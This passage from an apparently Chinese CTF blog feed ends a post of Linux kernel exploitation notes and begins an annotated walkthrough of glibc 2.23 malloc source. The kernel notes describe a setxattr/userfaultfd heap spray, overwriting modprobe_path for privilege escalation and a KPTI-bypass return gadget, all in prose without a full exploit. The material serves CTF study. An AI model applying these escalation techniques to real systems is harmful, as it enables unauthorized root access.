class="hljs-keyword">if</span> (!kvalue)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_from_user</span>(kvalue, value, size)) &#123;<br>error = -EFAULT;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>...<br>out:<br><span class="hljs-built_in">kvfree</span>(kvalue);<br><br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到其中调用了 <code>kvmalloc</code>函数来分配size大小的堆块，这个size几乎可以是任何大小,然后再函数的末尾会立刻将其释放，所以该系统调用通常用来搭配 <code>userfaultfd</code>来进行堆占位的利用技巧</p><h1 id="0x07-权限提升or解题手法"><a href="#0x07-权限提升or解题手法" class="headerlink" title="0x07 权限提升or解题手法"></a>0x07 权限提升or解题手法</h1><p>在漏洞利用之后，譬如说已经达成了任意读写或者说造成了栈溢出可构造ROP，那么我们该如何进行下一步来进行<code>Priviledge Escalation</code>呢，下面总结了我平时做题的一些手法</p><h2 id="1-覆写modprobe-path"><a href="#1-覆写modprobe-path" class="headerlink" title="1. 覆写modprobe_path"></a>1. 覆写modprobe_path</h2><p>主要是参考了这位师傅的博客<a href="https://www.anquanke.com/post/id/236126">modprobe_path</a>部分，然后自己跟着查源码</p><p>首先modprobe_path是可以进行配置的，可以查看到源码这部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">modprobe_path is set via /proc/sys.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">char</span> modprobe_path[KMOD_PATH_LEN] = CONFIG_MODPROBE_PATH;<br></code></pre></td></tr></table></figure><p>其中的<code>CONFIG_MODPROBE_PATH</code>一般配置为<code>/sbin/modprobe</code>,这里我们可以通过下面的命令进行查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">/ <span class="hljs-meta"># cat /proc/sys/kernel/modprobe   </span><br>/sbin/modprobe<br></code></pre></td></tr></table></figure><p>当我们的内核在运行一个错误格式或者未知的文件的时候，就会调用我们的 <code>modprobe_path</code>所指向的文件，因此如果说我们可以修改这里的值为我们想要执行的文件路径，就可以实现在内核级别的文件执行，当然内核的各种权限妥妥的0，比root用户还要高的等级。</p><p>这里首先给出我们函数调用树</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">do_execve</span>()</span><br><span class="hljs-function"><span class="hljs-title">do_execveat_common</span>()</span><br><span class="hljs-function"><span class="hljs-title">bprm_execve</span>()</span><br><span class="hljs-function"><span class="hljs-title">exec_binprm</span>()</span><br><span class="hljs-function"><span class="hljs-title">search_binary_handler</span>()</span><br><span class="hljs-function"><span class="hljs-title">__request_module</span>()</span><br><span class="hljs-function"><span class="hljs-title">call_modprobe</span>()</span><br><span class="hljs-function"><span class="hljs-title">call_usermodehelper</span>()</span><br></code></pre></td></tr></table></figure><p>这里可以查看到request_module的内容</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs stata">int __request_module(bool wait, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *fmt, ...)<br>&#123;<br>va_list <span class="hljs-keyword">args</span>;<br><span class="hljs-keyword">char</span> module_name[MODULE_NAME_LEN];<br>int <span class="hljs-keyword">ret</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We don&#x27;t allow synchronous module loading from async.  Module</span><br><span class="hljs-comment"> * init may invoke async_synchronize_full() which will end up</span><br><span class="hljs-comment"> * waiting for this task which already is waiting for the module</span><br><span class="hljs-comment"> * loading to complete, leading to a deadlock.</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(wait &amp;&amp; current_is_async());<br><br><span class="hljs-keyword">if</span> (!modprobe_path[0])<br><span class="hljs-keyword">return</span> -ENOENT;<br><br>va_start(<span class="hljs-keyword">args</span>, fmt);<br><span class="hljs-keyword">ret</span> = vsnprintf(module_name, MODULE_NAME_LEN, fmt, <span class="hljs-keyword">args</span>);<br>va_end(<span class="hljs-keyword">args</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">ret</span> &gt;= MODULE_NAME_LEN)<br><span class="hljs-keyword">return</span> -ENAMETOOLONG;<br><br><span class="hljs-keyword">ret</span> = security_kernel_module_request(module_name);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">ret</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">ret</span>;<br><br><span class="hljs-keyword">if</span> (atomic_dec_if_positive(&amp;kmod_concurrent_max) &lt; 0) &#123;<br>pr_warn_ratelimited(<span class="hljs-string">&quot;request_module: kmod_concurrent_max (%u) close to 0 (max_modprobes: %u), for module %s, throttling...&quot;</span>,<br>    atomic_read(&amp;kmod_concurrent_max),<br>    MAX_KMOD_CONCURRENT, module_name);<br><span class="hljs-keyword">ret</span> = wait_event_killable_timeout(kmod_wq,<br>  atomic_dec_if_positive(&amp;kmod_concurrent_max) &gt;= 0,<br>  MAX_KMOD_ALL_BUSY_TIMEOUT * HZ);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">ret</span>) &#123;<br>pr_warn_ratelimited(<span class="hljs-string">&quot;request_module: modprobe %s cannot be processed, kmod busy with %d threads for more than %d seconds now&quot;</span>,<br>    module_name, MAX_KMOD_CONCURRENT, MAX_KMOD_ALL_BUSY_TIMEOUT);<br><span class="hljs-keyword">return</span> -ETIME;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">ret</span> == -ERESTARTSYS) &#123;<br>pr_warn_ratelimited(<span class="hljs-string">&quot;request_module: sigkill sent for modprobe %s, giving up&quot;</span>, module_name);<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">ret</span>;<br>&#125;<br>&#125;<br><br>trace_module_request(module_name, wait, _RET_IP_);<br><br><span class="hljs-keyword">ret</span> = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);<br><br>atomic_inc(&amp;kmod_concurrent_max);<br>wake_up(&amp;kmod_wq);<br><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">ret</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://imgsrc.baidu.com/forum/pic/item/377adab44aed2e732503af1fc101a18b87d6fa1f.jpg"></p><p>其中涉及到 <code>modprobe_path</code>的比较，因此我们可以在这里查看该指针</p><p>而这里我们可以通过vmmap来查看其权限，可以发现其为正常的rw权限</p><h2 id="2-swapgs-restore-regs-and-return-to-usermode"><a href="#2-swapgs-restore-regs-and-return-to-usermode" class="headerlink" title="2.swapgs_restore_regs_and_return_to_usermode"></a>2.swapgs_restore_regs_and_return_to_usermode</h2><p>通常用于返回用户态，并且绕过kpti页表隔离，在vmlinux中找不到对应符号，可以通过ida或者关闭了kaslr在gdb当中调试得到</p><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h1><ol><li><a href="https://ctf-wiki.org/pwn/linux/kernel-mod">ctf-wiki</a></li><li><a href="https://x1ng.top/2020/12/22/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF-%E4%B8%80/">X1ng师傅文章</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Malloc_Free</title>
    <link href="/2023/06/17/Malloc-Free/"/>
    <url>/2023/06/17/Malloc-Free/</url>
    
    <content type="html"><![CDATA[<p>#malloc&amp;free源码分析<br>其作为堆利用的重点，需要我们透彻了解其中细节，我们首先从malloc开始分析，但在此之前，我们需要了解一些重要的数据结构。本章分析版本为glibc-2.23，再之后讨论2.27即以上版本的差异</p><h2 id="0x00-重要的数据结构们"><a href="#0x00-重要的数据结构们" class="headerlink" title="0x00 重要的数据结构们"></a>0x00 重要的数据结构们</h2><h3 id="1-malloc-state"><a href="#1-malloc-state" class="headerlink" title="1. malloc_state"></a>1. malloc_state</h3><p>首先便是我们经常接触的arena</p><pre><code class="hljs">struct malloc_state&#123;  /* Serialize access.  */  mutex_t mutex;  /* Flags (formerly in max_fast).  */  int flags;  /* fastbin链条数组 */  mfastbinptr fastbinsY[NFASTBINS];  /*top chunk 指针 */  mchunkptr top;  /* The remainder from the most recent split of a small request */  mchunkptr last_remainder;  /* NBINS为宏，带☞128，这里包含了除fastbin的所有bin指针 */  mchunkptr bins[NBINS * 2 - 2];  /* bins数组的位图 */  unsigned int binmap[BINMAPSIZE];  /* 链接下一个malloc_state的指针 */  struct malloc_state *next;  /* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  */  struct malloc_state *next_free;  /* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  */  INTERNAL_SIZE_T attached_threads;  /* 在本arena当中从系统处获取到的内存大小  */  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;;</code></pre><p>其结构在源码当中表现为宏<code>mstate</code></p><h3 id="2-malloc-chunk"><a href="#2-malloc-chunk" class="headerlink" title="2. malloc_chunk"></a>2. malloc_chunk</h3><pre><code class="hljs">struct malloc_chunk &#123;  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */  struct malloc_chunk* fd;         /* double links -- used only if free. */  struct malloc_chunk* bk;  /* Only used for large blocks: pointer to next larger size.  */  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */  struct malloc_chunk* bk_nextsize;&#125;;</code></pre><h3 id="3-源码自带的malloc-chunk细节，十分友善"><a href="#3-源码自带的malloc-chunk细节，十分友善" class="headerlink" title="3. 源码自带的malloc_chunk细节，十分友善"></a>3. 源码自带的malloc_chunk细节，十分友善</h3><pre><code class="hljs">/*   malloc_chunk details:    (The following includes lightly edited explanations by Colin Plumb.)    Chunks of memory are maintained using a `boundary tag&#39; method as    described in e.g., Knuth or Standish.  (See the paper by Paul    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a    survey of such techniques.)  Sizes of free chunks are stored both    in the front of each chunk and at the end.  This makes    consolidating fragmented chunks into bigger chunks very fast.  The    size fields also hold bits representing whether chunks are free or    in use.    An allocated chunk looks like this:    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk, if allocated            | |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of chunk, in bytes                       |M|P|      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             User data starts here...                          .        .                                                               .        .             (malloc_usable_size() bytes)                      .        .                                                               |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of chunk                                     |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of    the malloc code, but &quot;mem&quot; is the pointer that is returned to the    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.    Chunks always begin on even word boundaries, so the mem portion    (which is returned to the user) is also on an even word boundary, and    thus at least double-word aligned.    Free chunks are stored in circular doubly-linked lists, and look like this:    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk                            |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    `head:&#39; |             Size of chunk, in bytes                         |P|      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Forward pointer to next chunk in list             |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Back pointer to previous chunk in list            |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Unused space (may be 0 bytes long)                .        .                                                               .        .                                                               |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    `foot:&#39; |             Size of chunk, in bytes                           |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    The P (PREV_INUSE) bit, stored in the unused low-order bit of the    chunk size (which is always a multiple of two words), is an in-use    bit for the *previous* chunk.  If that bit is *clear*, then the    word before the current chunk size contains the previous chunk    size, and can be used to find the front of the previous chunk.    The very first chunk allocated always has this bit set,    preventing access to non-existent (or non-owned) memory. If    prev_inuse is set for any given chunk, then you CANNOT determine    the size of the previous chunk, and might even get a memory    addressing fault when trying to do so.    Note that the `foot&#39; of the current chunk is actually represented    as the prev_size of the NEXT chunk. This makes it easier to    deal with alignments etc but can be very confusing when trying    to extend or adapt this code.    The two exceptions to all this are     1. The special chunk `top&#39; doesn&#39;t bother using the    trailing size field since there is no next contiguous chunk    that would have to index off it. After initialization, `top&#39;    is forced to always exist.  If it would become less than    MINSIZE bytes long, it is replenished.     2. Chunks allocated via mmap, which have the second-lowest-order    bit M (IS_MMAPPED) set in their size fields.  Because they are    allocated one-by-one, each must contain its own trailing size field.*/</code></pre><h2 id="0x01-malloc步骤"><a href="#0x01-malloc步骤" class="headerlink" title="0x01 malloc步骤"></a>0x01 malloc步骤</h2><h3 id="step1-malloc环境准备"><a href="#step1-malloc环境准备" class="headerlink" title="step1 malloc环境准备"></a>step1 malloc环境准备</h3><p>首先我们调用<code>malloc(size)</code>的时候，调用的库函数实际上为<code>_libc_malloc</code>，如下：</p><pre><code class="hljs">void * __libc_malloc (size_t bytes)&#123;  mstate ar_ptr;  void *victim;  void *(*hook) (size_t, const void *)    = atomic_forced_read (__malloc_hook);      if (__builtin_expect (hook != NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS (0));   //调用malloc_hook  arena_get (ar_ptr, bytes);  //表现为宏，获取arena指针  victim = _int_malloc (ar_ptr, bytes);  //调用_int_malloc，返回分配chunk指针，参数一为arena指针，参数二为我们的需要分配的字节  /* Retry with another arena only if we were able to find a usable arena     before.  */  if (!victim &amp;&amp; ar_ptr != NULL)    &#123;      LIBC_PROBE (memory_malloc_retry, 1, bytes);      ar_ptr = arena_get_retry (ar_ptr, bytes);      victim = _int_malloc (ar_ptr, bytes);    &#125;  if (ar_ptr != NULL)    (void) mutex_unlock (&amp;ar_ptr-&gt;mutex);  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||          ar_ptr == arena_for_chunk (mem2chunk (victim)));  return victim;&#125;</code></pre><p>可以发现我们的<code>_libc_malloc</code>函数主要功能是获取合适的<code>arena</code>，然后传递给<code>_int_malloc</code>分配真正的堆块，然后我们来观察<code>_int_malloc</code>，而我们该函数十分长，因此我们逐步来看，首先看到定义的一些字段，如下：</p><pre><code class="hljs">static void * _int_malloc (mstate av, size_t bytes)&#123;  INTERNAL_SIZE_T nb;               /* normalized request size */  unsigned int idx;                 /* 字节所关联的bin数组下标 */  mbinptr bin;                      /* bin数组下标所对应的bin指针 */  mchunkptr victim;                 /* 检查/选择得到的chunk指针 */  INTERNAL_SIZE_T size;             /* 得到的chunk大小 */  int victim_index;                 /* 所得chunk对应bin的index */  mchunkptr remainder;              /* 分块后的剩余部分 */  unsigned long remainder_size;     /* 剩余部分大小 */  unsigned int block;               /* bit map traverser */  unsigned int bit;                 /* bit map traverser */  unsigned int map;                 /* current word of binmap */  mchunkptr fwd;                    /* misc temp for linking */  mchunkptr bck;                    /* misc temp for linking */  const char *errstr = NULL;</code></pre><p>然后我们继续来看接下来的步骤：</p><pre><code class="hljs">  /*        无他，通过我们需求的字节大小来转变至实际需要的堆块大小   */  checked_request2size (bytes, nb);</code></pre><hr><h4 id="题外话：checked-request2size"><a href="#题外话：checked-request2size" class="headerlink" title="题外话：checked_request2size"></a>题外话：checked_request2size</h4><p>（注意这里是单独的宏表示，非int_malloc）<br>checked_request2size其宏表示为</p><pre><code class="hljs">#define request2size(req)                                         \  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \   MINSIZE :                                                      \   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)/*  Same, except also perform argument check */#define checked_request2size(req, sz)                             \  if (REQUEST_OUT_OF_RANGE (req)) &#123;      \      __set_errno (ENOMEM);      \      return 0;      \    &#125;      \  (sz) = request2size (req);</code></pre><p>解释结束（下面继续int_malloc）</p><hr><pre><code class="hljs">  /* 若传入的av为空，那么转回调用sysmalloc，通过mmap来分配出一个chunk */  if (__glibc_unlikely (av == NULL))    &#123;      void *p = sysmalloc (nb, av);      if (p != NULL)    alloc_perturb (p, bytes);      return p;    &#125;</code></pre><h3 id="step2-若在fastbin范围"><a href="#step2-若在fastbin范围" class="headerlink" title="step2 若在fastbin范围"></a>step2 若在fastbin范围</h3><p>然后接下来判断其是否位于fastbin范围</p><pre><code class="hljs">  /*     如果该size位于fastbins范围， 首先检查合并堆块.     即使av未初始化，该代码也是可正常安全执行的, 因此我们可以在不检查的情况下执行   */  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))    &#123;      idx = fastbin_index (nb);  //得到fastbin数组的下标      mfastbinptr *fb = &amp;fastbin (av, idx); //为一个宏，得到fastbinsY元素指针      mchunkptr pp = *fb;      do        &#123;          victim = pp;            /* 若未找到合适的victim，跳出循环 */          if (victim == NULL)            break;        &#125;      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))             != victim);  //这里该函数为一个原子操作，目的是交换fb与victim-&gt;fd的值，也就是从链头开始取    /* 下面就是判断取出的victim是否通过检查 */      if (victim != 0)        &#123;          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) //检查堆块的size位            &#123;              errstr = &quot;malloc(): memory corruption (fast)&quot;;            errout:              malloc_printerr (check_action, errstr, chunk2mem (victim), av);              return NULL;            &#125;          check_remalloced_chunk (av, victim, nb);  //检查重分配堆块          void *p = chunk2mem (victim); //堆块指针转为指向返回内存的宏          alloc_perturb (p, bytes); //堆块清0          return p;        &#125;    &#125;</code></pre><p>其中大致含义即为从fastbinsY链表数组找到对应的下标，然后从头取出fastbin，返回给用户。</p><h3 id="step3-若在small范围当中"><a href="#step3-若在small范围当中" class="headerlink" title="step3 若在small范围当中"></a>step3 若在small范围当中</h3><p>下面我们继续<code>_int_malloc</code>，执行到这里表示我们fastbin超出其大小范围，或者说使用fastbin分配失败，然后就会判断其进入smallbin的判断当中</p><pre><code class="hljs">/*    如果请求的size大小属于smallbin范围，我们则检查通用的bins数组.  Since these &quot;smallbins&quot;     hold one size each, no searching within bins is necessary.     (如果是largebin范围, 我们必须等到 unsorted chunks 被处理为寻找最佳适配块. But for small ones, fits are exact     anyway, so we can check now, which is faster.)   */  if (in_smallbin_range (nb))    &#123;      idx = smallbin_index (nb);      bin = bin_at (av, idx); //获取对应bin链表数组下标      if ((victim = last (bin)) != bin) //last(bin)为宏bin-&gt;bk,这里是判断他是否为空，若不为空则说明smallbin里面有堆块，进入下一步        &#123;          if (victim == 0) /* 初始化检查，若为0则说明并未初始化，我们的small bin的各项还是0 */            malloc_consolidate (av); //进行av初始化，也就是取出fast chunk各项堆块合并一下          else //这里说明我们已经经过了初始化，所以接下来就是普通的判断过程            &#123;              bck = victim-&gt;bk;                if (__glibc_unlikely (bck-&gt;fd != victim)) //检查                &#123;                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;              set_inuse_bit_at_offset (victim, nb); //设置相邻下一个堆块的inuse位              bin-&gt;bk = bck;              bck-&gt;fd = bin; //从尾部脱链              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);  //清空bytes字节大小的值              return p;            &#125;        &#125;    &#125;</code></pre><p>我们对于smallbin的分配也十分简单，那就是直接从尾部开始取，但是在取之前我们会判断arena是否进行过初始化，若没有进行初始化，则调用<code>malloc_consolidate</code>进行初始化</p><hr><h4 id="题外话：malloc-consolidate"><a href="#题外话：malloc-consolidate" class="headerlink" title="题外话：malloc_consolidate"></a>题外话：malloc_consolidate</h4><p>这里是我们单独的<code>malloc_consolidate</code>函数讲解，与上面<code>_int_malloc</code>单独分开，整体代码如下：</p><pre><code class="hljs">/*  ------------------------- malloc_consolidate -------------------------  malloc_consolidate是一个用来拆除fastbins中chunk的特殊free()函数.  free()本身不能用于此目的，因为在其他情况下他可能将堆块放入fastbins当中  因此我们需要使用一个相似的操作来代替free()代码。  当然，因为该代码在malloc的工程中是第一次被调用 ，他是一个极佳的位置来触发我们的初始化代码*/static void malloc_consolidate(mstate av)&#123;  mfastbinptr*    fb;                 /* 目前正在被合并的fastbin chunk */  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */  mchunkptr       p;                  /* current chunk being consolidated */  mchunkptr       nextp;              /* next chunk to consolidate */  mchunkptr       unsorted_bin;       /* bin header */  mchunkptr       first_unsorted;     /* chunk to link to */  /* These have same use as in free() */  mchunkptr       nextchunk;  INTERNAL_SIZE_T size;  INTERNAL_SIZE_T nextsize;  INTERNAL_SIZE_T prevsize;  int             nextinuse;  mchunkptr       bck;  mchunkptr       fwd;  /*    如果max_fast 为0，则说明arena并未初始化，因此执行下面的步骤  */  if (get_max_fast () != 0) &#123;    clear_fastchunks(av);    unsorted_bin = unsorted_chunks(av); //获取unsorted bin的bins数组下标    /*      移除fastbins当中所有的chunk，然后进行合并，再紧接着放入我们的unsorted bin链条当中. Among other reasons for doing this,      placing in unsorted bin avoids needing to calculate actual bins      until malloc is sure that chunks aren&#39;t immediately going to be      reused anyway.    */    maxfb = &amp;fastbin (av, NFASTBINS - 1); //获取最大块的fastbin    fb = &amp;fastbin (av, 0); //获取最小快的fastbin    do &#123;      p = atomic_exchange_acq (fb, 0); //纳米交换！小子      if (p != 0) &#123; //如果说换出来的堆块指针非0，那么就说明该链条上面存在fastbin堆块    do &#123;      check_inuse_chunk(av, p); //查询下一个堆块的inuse来表示该堆块是否被使用，以及是否是mmap分配，但这里没怎么理解，因为fastbin的inuse不应该都是始终为1的么，这里可能是检查紧邻的下一个堆块可能不属于fastbin范围时的检测      nextp = p-&gt;fd;      /* Slightly streamlined version of consolidation code in free() */      size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);   //获取堆块size      nextchunk = chunk_at_offset(p, size); //为一个宏，这里即为p+size      nextsize = chunksize(nextchunk); //获取next堆块的size      if (!prev_inuse(p)) &#123; //查看p堆块前面的堆块是否分配，若未分配则进行下面的步骤        prevsize = p-&gt;prev_size;            size += prevsize;        p = chunk_at_offset(p, -((long) prevsize)); //即为上面p + prevsize前一个块地址        unlink(av, p, bck, fwd); //大名鼎鼎的unlink，在2.23版本表现为一个宏      &#125;      if (nextchunk != av-&gt;top) &#123;  //如果nextchunk不是topchunk，则往下走        nextinuse = inuse_bit_at_offset(nextchunk, nextsize); //判断nextchunk的下一块inuse位        if (!nextinuse) &#123; //nextinuse为0说明该块是空的          size += nextsize;          unlink(av, nextchunk, bck, fwd); //unlink该nextchunk        &#125; else //nextinuse 为1则说明该块正在被使用，因此清该堆块的inuse位为0          clear_inuse_bit_at_offset(nextchunk, 0);        first_unsorted = unsorted_bin-&gt;fd;        unsorted_bin-&gt;fd = p;        first_unsorted-&gt;bk = p; //将fastbin取出/合并后的堆块存入unsortedbin，从链头放入        if (!in_smallbin_range (size)) &#123; //如果为largebin范围，则置空fd/bk_nextsize          p-&gt;fd_nextsize = NULL;          p-&gt;bk_nextsize = NULL;        &#125;        set_head(p, size | PREV_INUSE);  //设置堆块细节，也就是头部分和脚部分        p-&gt;bk = unsorted_bin;        p-&gt;fd = first_unsorted;        set_foot(p, size);      &#125;      else &#123; //如果nextchunk是topchunk        size += nextsize;  //合并为top_chunk        set_head(p, size | PREV_INUSE);        av-&gt;top = p;      &#125;    &#125; while ( (p = nextp) != 0);      &#125;    &#125; while (fb++ != maxfb);  &#125;  else &#123; //若未初始化，则使用下面代码进行一个简单的初始化    malloc_init_state(av);    check_malloc_state(av);  &#125;&#125;</code></pre><h4 id="题外话：-unlink宏"><a href="#题外话：-unlink宏" class="headerlink" title="题外话： unlink宏"></a>题外话： unlink宏</h4><p>其中unlink宏如下：</p><pre><code class="hljs">/* 从bin链表数组当中取出一个chunk */#define unlink(AV, P, BK, FD) &#123;                                            \    FD = P-&gt;fd;      \    BK = P-&gt;bk;      \    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \  //检查一：p-&gt;fd-&gt;bk == p &amp;&amp; p-&gt;bk-&gt;fd == p      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \    else &#123;      \        FD-&gt;bk = BK;      \         BK-&gt;fd = FD;      \ //脱链操作        if (!in_smallbin_range (P-&gt;size)      \  //不在smallbin范围，那么就是在largebin范围            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \          || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \ //检查二：p-&gt;fd_nextsize-&gt;bk_nextsize == p &amp;&amp; p-&gt;bk_nextsize-&gt;fd_nextsize == p          malloc_printerr (check_action,      \                   &quot;corrupted double-linked list (not small)&quot;,    \                   P, AV);      \            if (FD-&gt;fd_nextsize == NULL) &#123;      \ //如果在小链条中                if (P-&gt;fd_nextsize == P)      \ //如果largebin链条就一个，则往下走                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \                 else &#123;      \                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \                     FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \ //largebin脱链                  &#125;      \              &#125; else &#123;      \ //若刚好p为小链条最后一个                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \              &#125;      \          &#125;      \      &#125;      \&#125;</code></pre><p>综上所述，<code>malloc_consolidate</code>函数的目的就是从fastbin当中该取的chunk取出，该合并的合并，然后存入<code>unsorted bin</code>当中，说完该函数，那么我们回到咱们的<code>_int_malloc</code>函数当中</p><hr><h3 id="step4-清理堆块碎片"><a href="#step4-清理堆块碎片" class="headerlink" title="step4 清理堆块碎片"></a>step4 清理堆块碎片</h3><p>上面我们讲到了smallbin判断，但如果说我们请求的bytes既不在fastbin范围，也不在smallbin范围当中呢</p><pre><code class="hljs">/*     如果我们是largebinsize的请求, 在我们继续之前，我们先合并一下咱们的fastbin，也就是调用mallock_consolidate函数     虽然这个举动看起来是在还仍保留有大量空闲区块的同时来消除所有的fastbin堆块, 但是他避免了因fastbin堆块导致的碎片问题。   */  else    &#123;      idx = largebin_index (nb); //获取largebin 的下标      if (have_fastchunks (av))         malloc_consolidate (av); //合并fastbinchunk，然后摘除他们    &#125;</code></pre><p>在我们调用完<code>malloc_consolidate</code>之后，我们进入接下来的判断，也就是进入我们的外部大循环：</p><h3 id="step5-大循环-unsortedbin清理"><a href="#step5-大循环-unsortedbin清理" class="headerlink" title="step5 大循环-unsortedbin清理"></a>step5 大循环-unsortedbin清理</h3><pre><code class="hljs"> /*         处理最近释放或剩余的块，仅在完全匹配的情况下获取一个，    